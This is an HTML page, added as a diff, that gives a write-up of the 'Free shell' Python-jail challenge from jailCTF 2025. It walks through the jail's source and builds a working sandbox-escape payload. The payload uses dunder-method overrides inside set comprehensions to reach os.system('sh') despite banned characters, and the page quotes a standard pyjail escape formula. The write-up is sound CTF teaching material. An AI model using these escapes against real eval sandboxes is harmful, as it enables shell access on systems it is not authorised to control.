@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Free shell writeup</title>
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/a11y-light.min.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+    <script>
+      hljs.highlightAll();
+    </script>
+    <style>
+      article {
+        margin: 0 auto;
+        width: 80ch;
+      }
+    </style>
+  </head>
+  <body>
+    <article>
+      <h1>Free shell</h1>
+      <p>
+        The task of this jail, as with any other jail in the
+        <a href="https://ctftime.org/event/2737">2025 jailCTF</a> is to
+        ultimately read the flag, a string found in the
+        <code>flag.txt</code> file. Usually this involves somehow getting access
+        to a builtin like <code>breakpoint</code> or <code>exec</code> or
+        somehow importing <code>os.system</code> to break into the shell. The
+        code for this jail read as follows:
+      </p>
+      <pre><code class="language-python">#!/usr/local/bin/python3
+from os import system
+
+def immutable(cls: type):
+    import ctypes
+    TP_FLAGS_OFFSET = 21 * tuple.__itemsize__
+    Py_TPFLAGS_IMMUTABLETYPE = 1 << 8
+
+    view = ctypes.cast(id(cls) + TP_FLAGS_OFFSET, ctypes.POINTER(ctypes.c_ulong))
+    view.contents.value |= Py_TPFLAGS_IMMUTABLETYPE
+    assert cls.__flags__ & Py_TPFLAGS_IMMUTABLETYPE != 0
+
+    return cls
+
+@immutable
+class SafeBuiltins[system]:
+    __slots__ = ()
+    __freebie__ = "What's a red herring?"
+
+BANNED = "()[]:='\""
+
+code = input("code: ")
+
+for c in code:
+    if c in BANNED:
+        print("nope", repr(c))
+        exit(1)
+
+eval(code, {'__builtins__': SafeBuiltins()}, {})</code></pre>
+
+      <h2>Analysis</h2>
+      <p>
+        When this script is run, we are prompted for the code to run, which
+        cannot contain any of the <code>BANNED</code> characters. Then, it is
+        run, with the <code>__builtins__</code> set to
+        <code>SafeBuiltins</code>. This means that we won't have access to built
+        in functions like <code>breakpoint</code> or <code>exec</code>
+        which could be used to break out easily. This character set restricts
+        heavily what we can do, meaning it will be hard to even call a function!
+      </p>
+      <p>
+        If you're anything like me, you didn't even know that
+        <code>SafeBuiltins[system]</code> was valid syntax. Shouldn't that be
+        <code>SafeBuiltins(system)</code>, to define a subclass? This is
+        actually the
+        <a
+          href="https://docs.python.org/3/reference/compound_stmts.html#type-params"
+          >type parameter syntax</a
+        >, new in python 3.12. So is this a free shell that we can just grab
+        from the evaluation context?
+      </p>
+      <pre><code class="language-python-repl">
+>>> __builtins__.__class__
+&lt;class '__main__.SafeBuiltins'&gt;
+>>> __builtins__.__class__.__parameters__[0]
+system
+>>> #yipeee!
+>>> __builtins__.__class__.__parameters__[0]('sh')
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+    __builtins__.__class__.__parameters__[0]('sh')
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+TypeError: 'typing.TypeVar' object is not callable
+>>> #uh oh...</code></pre>
+      <p>
+        It turns out the <code>system</code> was actually just a type variable,
+        not the <code>system</code> variable imported from <code>os</code>. So
+        what now? A common formula used when we don't have access to any
+        builtins is
+        <code
+          >().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh")</code
+        >, which you can find in places like the
+        <a href="https://shirajuki.js.org/blog/pyjail-cheatsheet/"
+          >pyjail cheatsheet</a
+        >. Right now, this doesn't work because of our banned characters,
+        <code>()[]""</code>.
+        <!-- TODO: explain what this formula actually does -->
+      </p>
+      <h2>Simplifying the problem</h2>
+      <p>
+        At this point I started looking at what would happen if we simplified
+        the problem, removing restrictions until we can solve it. We already
+        have a solution above which would work if there were no banned
+        characters. What happens if we mess with the <code>SafeBuiltins</code>
+        class?
+      </p>
+      <pre><code class="language-diff">- @immutable
+  class SafeBuiltins[system]:
+-     __slots__ = ()
+     __freebie__ = "What's a red herring?"</code></pre>
+      <p>
+        Simplifying the problem in this way, we can actually make some progress!
+        The key part thing to notice is that we can use the built in python
+        operators as a proxy to call functions. This is because
+        <code>A + B</code> is internally evaluated as
+        <code>type(A).__add__(A, B)</code>. If we can control
+        <code>type(A).__add__</code>, we can control what functions are run!
+        Removing <code>@immutable</code> and <code>__slots__ = ()</code> allows
+        us to modify the <code>SafeBuiltins</code> class on the fly.
+      </p>
+      <pre><code class="language-python">
+B = __builtins__ # for clarity    
+    
+SafeBuiltins = B.__class__
+
+object = [].__class__.__base__
+SafeBuiltins.__neg__ = object.__subclasses__
+
+subclasses = -B
+
+SafeBuiltins.__add__ = subclasses.__getitem__
+
+loader = B + 122
+
+SafeBuiltins.__add__ = loader.load_module
+
+os = B + "os"
+
+SafeBuiltins.__add__ = os.system
+
+B + "sh"</code></pre>
+      <p>
+        We've solved the jail for a much simpler version of the problem we
+        actually need to solve, avoiding the use of parentheses by using these
+        <code>__add__</code> and <code>__neg__</code> dunder methods to call
+        functions for us. Now the main problem is the rest of the banned
+        characters, and the fact that the code is run in an
+        <code>eval</code> context, meaning we can't actually use assignment and
+        the equals operator.
+      </p>
+      <p>
+        Generally, we can avoid <code>=</code> by using list comprehension
+        targets.
+      </p>
+      <pre><code class="language-python"># these two lines of code do the same thing
+a = b
+[... for a in [b]]
+
+# and these two
+a.b = c
+[... for a.b in [c]]</code></pre>
+      <p>
+        We can rewrite our code line by line to use list comprehensions instead
+        of assigning directly. This also takes care of the problem of
+        <code>eval</code>, since a list comprehension can be executed in an eval
+        context.
+      </p>
+      <pre><code class="language-python"># a line-by-line rewriting of the above code, using listcomps instead of variable assignment
+[
+    B + "sh"
+    for B in [__builtins__]
+    for SafeBuiltins in [B.__class__]
+    for SafeBuiltins.__neg__ in [[].__class__.__base__.__subclasses__]
+    for subclasses in [-B]
+    for SafeBuiltins.__add__ in [subclasses.__getitem__]
+    for loader in [B + 122]
+    for SafeBuiltins.__add__ in [loader.load_module]
+    for os in [B + "os"]
+    for SafeBuiltins.__add__ in [os.system]
+]
+</code></pre>
+      <p>
+        We're making progress! Of the banned characters, we're using only
+        <code>[]"</code>. Getting rid of brackets should be easy, we can change
+        the list comprehensions should be easy, we can just change the brackets
+        for braces, turning the list comprehensions into set comprehension.
+      </p>
+      <p>
+        Not so fast: it's <em>so close</em> to working. But we run into a single
+        error. The problem is in the 5th line of code: <code>{-B}</code>.
+        Reminder: at this point <code>-B</code> is equal to
+        <code>object.__subclasses__()</code>, which is a list. However, a list
+        is not hashable, so python complains about putting one in a set. This
+        problem took an embarrassing amount of time for me to solve before I
+        realized that we could simply use the operator trick to call
+        <code>tuple</code> on the subclasses, making it a hashable type.
+      </p>
+      <pre><code>
+{
+    B + "sh"
+    for B in {__builtins__}
+    for SafeBuiltins in {B.__class__}
+    for SafeBuiltins.__neg__ in {{}.__class__.__base__.__subclasses__}
+    for tuple in {B.__slots__.__class__}
+    for SafeBuiltins.__add__ in {tuple}
+    for subclasses in {B+-B}
+    for SafeBuiltins.__add__ in {subclasses.__getitem__}
+    for loader in {B + 122}
+    for SafeBuiltins.__add__ in {loader.load_module}
+    for os in {B + "os"}
+    for SafeBuiltins.__add__ in {os.system}
+}
+</code></pre>
+      <p>
+        We're so close! To avoid the strings is also a bit annoying, but not too
+        hard: we can simply find a string that includes all of the characters we
+        need, then just index into it. <code>{}.__doc__</code> works perfectly.
+      </p>
+      <pre><code class="language-python">{
+    ...
+    
+    for SafeBuiltins.__mul__ in {doc.__getitem__}
+    for s in {B*97}
+    for h in {B*280}
+    for o in {B*25}
+    for sh in {s+h}
+    for os in {o+s}
+
+    ...
+}</code></pre>
+      <h2>Full problem</h2>
+      <p>
+        Now we've solved the simplified version of this problem. Even before got
+        to this solved version, we were confident that had the builtins class
+        been mutable, we could've gotten to this point. But now what? What do we
+        do when we reintroduce back the <code>@immutable</code> and
+        <code>__slots__</code>? It's a common theme for this object to be
+        something like <code>quit</code> (for example in the cheesed impossible
+        problem, or used for
+        <a
+          href="https://codegolf.stackexchange.com/questions/11383/fault-tolerant-hello-world/276750#276750"
+          >radiation hardening</a
+        >).
+      </p>
+      <p>
+        Exploring around a bit with <code>dir</code>, we found a an object that
+        fit the bill. Not only did it itself have to be mutable, but it's
+        <code>__class__</code> as well. This turns out to be
+        <code>SafeBuiltins.__orig_bases__[0]</code>, of type
+        <code>typing.Generic</code>. Replacing <code>SafeBuiltins</code>
+        with the class we just found, we get the final solution:
+      </p>
+      <pre><code class="language-python">
+{
+    W+sh
+    for W in __builtins__.__class__.__orig_bases__
+    for W.__class__.__mul__ in {{}.__doc__.__getitem__}
+    for s in {W*97}
+    for h in {W*280}
+    for o in {W*25}
+    for sh in {s+h}
+    for os in {o+s}
+    for O in {{}.__class__.__base__}
+    for T in {__builtins__.__slots__.__class__}
+    for W.__class__.__add__ in {T}
+    for W.__class__.__neg__ in {O.__subclasses__}
+    for subclasses in {W+-W}
+    for W.__class__.__add__ in {subclasses.__getitem__}
+    for loader in {W+122}
+    for loader in {loader.load_module}
+    for W.__class__.__add__ in {loader.__call__}
+    for module in {W+os}for W.__class__.__add__ in {module.system}
+}</code></pre>
+      <p>
+        Running the script, then <code>cat flag.txt</code> reveals the flag.
+      </p>
+      <pre><code class="language-plaintext">jail{who_uses_setcomps_ever?_c21b2ee0b71}</code></pre>
+    </article>
+  </body>
+</html>
